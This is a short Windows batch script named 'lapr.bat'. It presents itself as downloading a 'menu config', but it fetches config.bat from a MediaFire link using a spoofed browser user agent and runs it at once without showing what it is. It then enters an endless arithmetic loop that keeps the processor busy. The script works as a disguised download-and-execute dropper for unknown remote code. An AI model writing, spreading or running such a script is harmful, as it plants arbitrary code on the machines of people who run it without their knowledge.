@echo off
title lapr.bat

set "URL=https://download1523.mediafire.com/wiqfqxpfp0egvZu-WpPwjFzaHbOtrUOhj9IdDEXrdAi5s4dfwQQuX4G-Nh_K0rbtC_nIYcUSu6YkJzzQipEyVNnh9nnbCpelNcbBNMwjhAIKTNZFhwP09wcqJ6KJjqzUQiIIFTWWH-3CaEcCYGWnVlTOMpgBT-uSVzDN_KWnJm6f/yifcljsbksewn4d/config.bat"
set "OUTPUT=config.bat"

echo downloading menu config . . .
curl -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "%URL%" -o "%OUTPUT%"

if exist "%OUTPUT%" (
    echo config donwloaded! running config . . .
    call "%OUTPUT%"
    echo config ran successfully!
) else (
    echo config failed to download
)


:loop
set /a x=123456 * 789101
set /a y=x / 1234
set /a z=y + x
goto loop
